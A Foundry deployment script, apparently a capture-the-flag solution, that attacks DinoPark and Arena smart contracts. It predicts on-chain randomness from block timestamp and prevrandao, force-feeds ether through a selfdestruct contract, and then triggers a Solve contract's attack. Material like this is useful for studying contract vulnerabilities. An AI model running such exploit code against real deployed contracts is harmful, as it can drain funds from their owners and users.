// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

import "../src/Solve.sol";
import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

contract ForceSend {
    constructor(address payable recipient) payable {
        selfdestruct(recipient);
    }
}

contract Deploy is Script {
    address dino = 0x05d59BdD1111eE3d1AbADC151BD11Ae4ead646E1;
    address arena = DinoPark(dino).arena();
    uint8 guess;

    function run() external {
        vm.startBroadcast();

        guess = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao))) % 100);

        if (guess < 31)
            revert("Pre-attack condition 01 is not cleared!");
        else
            console.log("Pre-attack condition is cleared!");

        new ForceSend{value: 1 ether}(payable(arena));

        Arena(arena).fight(guess, Arena.FightMode.Normal);

        Solve solve = new Solve(dino, arena);

        console.log("DinoPark Contract Address:", address(dino));
        console.log("Arena Contract Address:", address(arena));
        console.log("Arena Contract Balance:", address(arena).balance + 1 ether);
        console.log("Solve contract deployed at:", address(solve));

        solve.attack();

        vm.stopBroadcast();
    }

    fallback() external payable {
    }
}